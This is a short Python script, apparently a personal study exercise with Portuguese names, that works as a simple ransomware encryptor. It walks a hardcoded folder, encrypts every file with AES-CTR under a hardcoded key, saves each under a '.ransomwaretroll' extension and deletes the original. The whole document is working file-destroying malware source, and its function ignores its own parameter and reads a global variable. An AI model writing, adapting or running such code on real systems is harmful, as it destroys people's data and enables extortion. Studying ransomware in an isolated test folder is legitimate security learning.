import os
import pyaes


def encriptador(diretorio_alvo):
    key = b"testeransomwares"
    for files in os.listdir(diretorio):
        os.chdir(diretorio)
        with open(files, 'rb') as rb:
            dados = rb.read()
            aes = pyaes.AESModeOfOperationCTR(key)
            criptografar = aes.encrypt(dados)
            novo_arquivo = os.path.basename(files) + '.ransomwaretroll'
            with open(novo_arquivo, 'wb') as wb:
                wb.write(criptografar)
                wb.close()
                rb.close()
            os.remove(files)


diretorio = 'D:\Python_Estudos\Cibersegurança\Criptografia\Teste Malware'
encriptador(diretorio)
